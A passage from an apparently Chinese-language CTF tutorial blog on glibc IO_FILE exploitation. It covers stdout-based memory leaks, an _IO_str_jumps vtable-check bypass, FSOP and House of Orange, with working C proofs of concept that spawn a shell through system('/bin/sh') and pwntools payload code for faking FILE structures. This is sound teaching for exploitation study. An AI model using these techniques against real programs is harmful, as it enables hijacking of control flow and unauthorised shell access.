class="line">= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">     <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     fp-&gt;_offset = new_pos;</span><br><span class="line">   &#125;</span><br><span class="line"> count = _IO_SYSWRITE (fp, data, to_do);</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li>最后 <code>_IO_SYSWRITE</code> 调用 <code>write (f-&gt;_fileno, data, to_do)</code> 输出数据，因此还需构造 <code>_fileno</code> 为标准输出描述符 1 。</li>
</ul>
<p>将上述条件综合描述为：</p>
<ul>
<li>设置 <code>_flag</code> &amp;~ <code>_IO_NO_WRITES</code> 即 <code>_flag</code> &amp;~ 0x8。</li>
<li>设置 <code>_flag</code> &amp; <code>_IO_CURRENTLY_PUTTING</code> 即 <code>_flag</code> | 0x800</li>
<li>设置 <code>_fileno</code> 为1。</li>
<li>设置 <code>_IO_write_base</code> 指向想要泄露的地方；<code>_IO_write_ptr</code> 指向泄露结束的地址。</li>
<li>设置 <code>_IO_read_end</code> 等于 <code>_IO_write_base</code> 或设置 <code>_flag</code> &amp; <code>_IO_IS_APPENDING</code> 即 <code>_flag</code> | 0x1000。</li>
<li>设置 <code>_IO_write_end</code> 等于 <code>_IO_write_ptr</code>（非必须）。</li>
</ul>
<p>满足上述五个条件，可实现任意读。<br>举例：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="type">char</span> buf[] = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> stack_buf[] = <span class="string">&quot;abcdefghi&quot;</span>;</span><br><span class="line">    i64 libc_base = (i64) &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">    FILE *fp = (FILE *) (libc_base + <span class="number">0x1ed6a0</span>);</span><br><span class="line">    fp-&gt;_flags &amp;= ~<span class="number">0x8</span>;</span><br><span class="line">    fp-&gt;_flags |= <span class="number">0x800</span>;</span><br><span class="line">    fp-&gt;_fileno = <span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = (<span class="type">char</span> *) buf;</span><br><span class="line">    fp-&gt;_IO_write_ptr = (<span class="type">char</span> *) &amp;buf[<span class="number">6</span>];</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_base;</span><br><span class="line">    <span class="built_in">puts</span>(stack_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>运行结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">123456abcdefghi</span><br></pre></td></tr></table></figure></div>
<h1 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="__IO_str_jumps"></a>__IO_str_jumps</h1><p>libc2.24 在 <code>IO_validate_vtable</code> 函数中对 <code>*vtable</code> 指针进行校验：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *</span><br><span class="line"><span class="built_in">IO_validate_vtable</span> (<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>vtable</code> 必须要满足 在 <code>__stop___IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，而我们伪造的vtable通常不满足这个条件。<br>但是 <code>_IO_str_jumps</code> 与 <code>__IO_wstr_jumps</code> 就位于 <code>__stop___libc_IO_vtables</code> 和 <code>__start___libc_IO_vtables</code> 之间，所以我们是可以利用他们来通过 <code>IO_validate_vtable</code> 的检测的,只需要将 <code>*vtable</code> 填成 <code>_IO_str_jumps</code> 或 <code>__IO_wstr_jumps</code> 地址即可。<br>利用方式主要有针对 <code>__IO_str_jumps</code> 中的 <code>_IO_str_finsh</code> 函数和 <code>_IO_str_overflow</code> 两种。 </p>
<h2 id="确定-IO-str-jumps-地址"><a href="#确定-IO-str-jumps-地址" class="headerlink" title="确定 __IO_str_jumps 地址"></a>确定 __IO_str_jumps 地址</h2><p>由于 <code>_IO_str_jumps</code> 不是导出符号，<code>libc.sym[&quot;_IO_str_jumps&quot;]</code> 查不到，我们可以利用 <code>_IO_str_jumps</code> 中的导出函数例如 <code>_IO_str_underflow</code> 进行辅助定位。首先先得到 <code>_IO_str_underflow</code> 地址，然后查找所有指向该地址的指针。由于 <code>_IO_str_underflow</code> 在 <code>_IO_str_jumps</code> 的偏移为 0x20 ，并且 <code>_IO_str_jumps</code> 的地址大于 <code>_IO_file_jumps</code> 地址，因此可以在选择满足上述条件中最小的地址作为 <code>_IO_str_jumps</code> 的地址。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bisect <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow = libc.symbols[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">IO_str_underflow_ptr = <span class="built_in">list</span>(libc.search(p64(IO_str_underflow)))</span><br><span class="line">IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + <span class="number">0x20</span>)] - <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(IO_str_jumps)</span><br></pre></td></tr></table></figure></div>
<h2 id="io-str-finish"><a href="#io-str-finish" class="headerlink" title="io_str_finish"></a>io_str_finish</h2><p>libc 直到 2.27 版本（有些版本的 2.27 已经修复），<code>_IO_str_finish</code> 都是下面这种实现手段。也就是说，如果修改 <code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为 <code>system</code> 地址，然后修改 <code>fp-&gt;_IO_buf_base</code> 为 <code>/bin/sh</code> 字符串地址，然后触发程序执行 <code>_IO_str_finish</code> 函数就可以得到 shell 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>具体的攻击流程如下：</p>
<ul>
<li>修改 <code>vatble</code> 指针<br>根据前面 FSOP 的思路，可以通过使程序执行 <code>_IO_flush_all_lockp</code> 函数，进而执行 <code>_IO_overflow</code> 。此时如果将 <code>vatble</code> 指针修改为指向 <code>&amp;_IO_str_jumps - 8</code> 的地址就可以执行 <code>_IO_str_finish</code> 。</li>
<li>伪造 <code>_IO_FILE</code><br> 与 FSOP 基本一致。<ul>
<li>要满足 <code>fp-&gt;_IO_buf_base</code> 不为空，并且由于它作为 <code>fp-&gt;_s._free_buffer</code> 的第一个参数，因此可以使用 <code>/bin/sh</code> 的地址。</li>
<li><code>fp-&gt;_flags</code> 要不包含 <code>_IO_USER_BUF</code>，它的定义为 <code>#define _IO_USER_BUF 1</code>，即 <code>fp-&gt;_flags</code> 最低位为 <code>0</code> 。</li>
<li>缓冲区需要有数据，即 <code>_IO_write_base</code> &lt; <code>_IO_write_ptr</code> 。</li>
<li><code>_mode</code> 需要小于等于 0 。</li>
</ul>
</li>
<li>修改 <code>((_IO_strfile *) fp)-&gt;_s._free_buffer</code> 为 <code>system</code> 地址，即将 <code>fp+0xE8</code> 除的值改为 <code>system</code> 地址。</li>
<li>最后通过 <code>exit</code> 等手段使程序执行 <code>_IO_flush_all_lockp</code> 函数，最终得到 shell 。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/862c73e5bc9e2712ddb4c15d5403b61d.png"
                      alt="在这里插入图片描述"
                ><br>下面举一个实际例子：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> i64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">char</span> i8;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//    i64 *fp = malloc(0x200);</span></span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;./123.txt&quot;</span>, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    i64 libc_base = (i64) &amp;system - <span class="number">0x4F440</span>;</span><br><span class="line">    i64 bin_sh_addr = libc_base + <span class="number">0x1B3E9A</span>;</span><br><span class="line">    i64 IO_str_jump_addr = libc_base + <span class="number">0x3E8360</span>;</span><br><span class="line">    i64 fake_IO_file_jump_addr = IO_str_jump_addr - <span class="number">0x8</span>;</span><br><span class="line">    *(i64 *) fp &amp;= ~<span class="number">1ULL</span>;</span><br><span class="line">    *(i64 *) ((i8 *) fp + <span class="number">0xE8</span>) = (i64) &amp;system;<span class="comment">//((_IO_strfile *) fp)-&gt;_s._free_buffer</span></span><br><span class="line">    *(i64 *) ((i8 *) fp + <span class="number">0xD8</span>) = fake_IO_file_jump_addr;<span class="comment">//*vtable</span></span><br><span class="line">    *((i64 *) fp + <span class="number">24</span>) = <span class="number">0x0</span>;<span class="comment">//_mode</span></span><br><span class="line">    *((i64 *) fp + <span class="number">4</span>) = <span class="number">0x0</span>;<span class="comment">//_IO_write_base</span></span><br><span class="line">    *((i64 *) fp + <span class="number">5</span>) = <span class="number">0x1</span>;<span class="comment">//_IO_write_ptr</span></span><br><span class="line">    *((i64 *) fp + <span class="number">7</span>) = bin_sh_addr;<span class="comment">//_IO_buf_base</span></span><br><span class="line"><span class="comment">//    i64 *list_all_ptr = (i64 *) (libc_base + 0x3ec660);</span></span><br><span class="line"><span class="comment">//    list_all_ptr[0] = (i64) fp;</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>libc 版本为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 7.3.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure></div>
<p>运行结果：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/adcefd5908c54681d743bb3400018f61.png"
                      alt="在这里插入图片描述"
                ></p>
<h1 id="与堆利用结合"><a href="#与堆利用结合" class="headerlink" title="与堆利用结合"></a>与堆利用结合</h1><h2 id="泄露-libc-基址"><a href="#泄露-libc-基址" class="headerlink" title="泄露 libc 基址"></a>泄露 libc 基址</h2><p>对于没有输出功能的堆题，要想泄露 libc 基址就需要劫持 <code>_IO_2_1_stdout_</code> 结构体。<br>以这道<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_24e4e65752923db914c053bc9c26ffc9" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，因为是 libc-2.23 版本，可以利用 fast bin attack 在 <code>_IO_2_1_stdout_-0x43</code> 处申请 fast bin。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/924cc5a0aa1ec3e3756ae5fc3e6a0d31.png"
                      alt="在这里插入图片描述"
                ><br>之后修改 <code>_IO_write_base</code> 指针的最低 1 字节为 <code>\x88</code> 使其指向 <code>_chain</code> 变量，而 <code>_chain</code> 变量中存储了 <code>_IO_2_1_stdin_</code> 结构体地址，程序在下一次输出内容时会先将 write buf 中的内容输出出来，因此可以泄露 libc 基地址。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x33</span> + p32(<span class="number">0xfbad1880</span>) + <span class="string">&quot;;sh;&quot;</span> + p64(<span class="number">0</span>) * <span class="number">3</span> + p8(<span class="number">0x88</span>))  <span class="comment"># 5 write_base -&gt; _IO_2_1_stdin_</span></span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/2af6c590bbb50328260ce32e7d38ff5f.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="伪造-vtable-劫持程序流程-1"><a href="#伪造-vtable-劫持程序流程-1" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h2><p>同样以前面这道<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/pwn_24e4e65752923db914c053bc9c26ffc9" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，首先利用 fast bin attack 在 <code>_IO_2_1_stdout_+157</code> 地址处申请 0x60 大小的堆块。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/65a0b011d6a6872ad7aab1104bee6698.png"
                      alt="在这里插入图片描述"
                ><br>由于 libc-2.23 版本没有 <code>_IO_vtable_check</code> 检查 <code>vtable</code> 地址，因此可以修改 <code>vtable</code> 指针指向事先在 bss 段伪造的 <code>vtable</code> 。在调用 IO 函数时会将 <code>_IO_2_1_stdout_</code> 结构体指针作为参数传入 <code>vtable</code> 中的函数，因此可以在 <code>_IO_2_1_stdout_</code> 结构体 flag 字段之后的 4 字节填充中写入 <code>;sh;</code> 来获取 shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/533cdb6b82f9b1138deb0bb8b155b770.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="FSOP-1"><a href="#FSOP-1" class="headerlink" title="FSOP"></a>FSOP</h2><p>FSOP（ File Stream Oriented Programming ） 的核心思想就是劫持 <code>_IO_list_all</code> 指向伪造的 <code>_IO_FILE_plus</code> 。之后使程序执行 <code>_IO_flush_all_lockp</code> 函数。该函数会刷新 <code>_IO_list_all</code> 链表中所有项的文件流，相当于对每个 FILE 调用 <code>fflush</code> ，也对应着会调用 <code>_IO_FILE_plus.vtable</code> 中的 <code>_IO_overflow</code> 。</p>
<p>劫持 <code>_IO_list_all</code> 的方式有两种：</p>
<ul>
<li>覆盖 <code>_IO_2_1_stderr_</code> 结构体，也就是下面这个例子</li>
<li>利用例如 large bin attack 的攻击方法将 <code>_IO_list_all</code> 覆盖成一个 chunk 地址，然后在该 chunk 上伪造 IO_FILE 结构体。例如后面 House of Pig 就采用了这个方法。</li>
</ul>
<p>以这道<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/ciscn_2019_n_7" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例，需要通过任意地址写修改 <code>_IO_2_1_stderr</code> 结构体然后 exit 调用 <code>_IO_flush_all_lockp</code> 从而实现 FSOP 。</p>
<p>在劫持 <code>_IO_2_1_stderr</code> 时除了修改 <code>vtable</code> 指针指向伪造 <code>vtable</code> 外，要想调用 <code>_IO_overflow</code> ，还需要修改 <code>_IO_2_1_stderr</code> 以满足以下条件：</p>
<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
<p>因此不妨将 vtable 伪造在 <code>_IO_2_1_stderr + 0x10</code> 处使 <code>_IO_2_1_stderr</code> 的 <code>fp-&gt;_IO_write_ptr</code> 恰好对应于 <code>vtable</code> 的 <code>_IO_overflow</code> 。然后将 <code>fp-&gt;_IO_write_ptr</code> 写入 <code>system</code> 函数地址。由于 <code>_IO_overflow</code> 传入的参数为 <code>_IO_2_1_stderr</code> 结构体，因此将结构体其实位置处写入 <code>/bin/sh</code> 字符串。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/239cffc0aedd07f3224149566b2084ce.png"
                      alt="在这里插入图片描述"
                ><br>IO_FILE 的伪造对应与代码中可以有如下定义：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh\x00&quot;</span>  <span class="comment"># _flags, an magic number</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_read_base</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_base</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_write_end</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_base;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span>  <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>])  <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">2</span>)  <span class="comment"># _fileno for stderr is 2</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>)  <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span>  <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span>  <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1ea0</span>)  <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0x160</span>)  <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span>  <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>)  <span class="comment"># _mode, usually -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span>  <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0x10</span>)  <span class="comment"># fake vtable</span></span><br></pre></td></tr></table></figure></div>
<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>house of orange 利用手法有两部分，前半部分是无 free 的情况下得到位于 unsorted bin 的 chunk ，后半部分是利用 unsorted bin attack 劫持 <code>_IO_list_all</code> 实现 FSOP 。</p>
<p>首先是第一部分。如果当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p>
<p> 但是执行 sysmalloc 来向系统申请内存有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。这需要 malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))</span><br></pre></td></tr></table></figure></div>

<p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p>
<p>在 sysmalloc 函数中存在对 top chunk size 的 check 如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record incoming configuration of top */</span></span><br><span class="line"></span><br><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = <span class="built_in">chunksize</span>(old_top);</span><br><span class="line">old_end = (<span class="type">char</span> *) (<span class="built_in">chunk_at_offset</span>(old_top, old_size));</span><br><span class="line">...</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">assert</span>((old_top == <span class="built_in">initial_top</span>(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">       ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">        <span class="built_in">prev_inuse</span>(old_top) &amp;&amp;</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line"><span class="built_in">assert</span>((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>伪造的 top chunk 的结束位置必须要对齐到内存页(4k)</p>
</li>
<li><p>size 要大于 MINSIZE(0x10)</p>
</li>
<li><p>size 要小于之后申请的 chunk size + MINSIZE(0x10)</p>
</li>
<li><p>size 的 prev inuse 位必须为 1</p>
</li>
</ul>
<p>通过上述检查后会进行 brk 系统调用来扩展 heap 段。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">size = nb + mp_.top_pad + MINSIZE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If contiguous, we can subtract out existing space that we hope to</span></span><br><span class="line"><span class="comment">   combine with new space. We add it back later only if</span></span><br><span class="line"><span class="comment">   we don&#x27;t actually get contiguous space.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (contiguous (av))</span><br><span class="line">  size -= old_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Round to a multiple of page size.</span></span><br><span class="line"><span class="comment">   If MORECORE is not contiguous, this ensures that we only call it</span></span><br><span class="line"><span class="comment">   with whole-page arguments.  And if MORECORE is contiguous and</span></span><br><span class="line"><span class="comment">   this is not first time through, this preserves page-alignment of</span></span><br><span class="line"><span class="comment">   previous calls. Otherwise, we correct to page-align below.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Don&#x27;t try to call MORECORE if argument is so big as to appear</span></span><br><span class="line"><span class="comment">   negative. Note that since mmap takes size_t arg, it may succeed</span></span><br><span class="line"><span class="comment">   below even if we cannot call MORECORE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    brk = (<span class="type">char</span> *) (MORECORE (size));</span><br><span class="line">    LIBC_PROBE (memory_sbrk_more, <span class="number">2</span>, brk, size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (brk != (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Call the `morecore&#x27; hook if necessary.  */</span></span><br><span class="line">    <span class="type">void</span> (*hook) (<span class="type">void</span>) = atomic_forced_read (__after_morecore_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">      (*hook)();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>此时堆的状态如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/58f74b778e8fa04af4ca279b2a02a1d6.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>如果是正常通过 brk 系统调用扩展 heap 区域，最终程序将直接增大 top chunk 的 size，但是由于之前已经将 top chunk 的 size 改小了，通不过下面的 if 判断。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="type">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">  set_head (old_top, (size + old_size) | PREV_INUSE);</span><br></pre></td></tr></table></figure></div>
<p>并且会通过接下来的检查：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Oops!  Someone else killed our space..  Can&#x27;t touch anything.  */</span></span><br><span class="line">    malloc_printerr (<span class="number">3</span>, <span class="string">&quot;break adjusted to free malloc space&quot;</span>, brk,</span><br><span class="line">av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>此时 ptmalloc 认为 heap 段已经不连续，ptmalloc 会为新的 heap 段的 top chunk 通过 brk 扩展 heap 区域，然后释放掉原先的 top chunk 。</p>
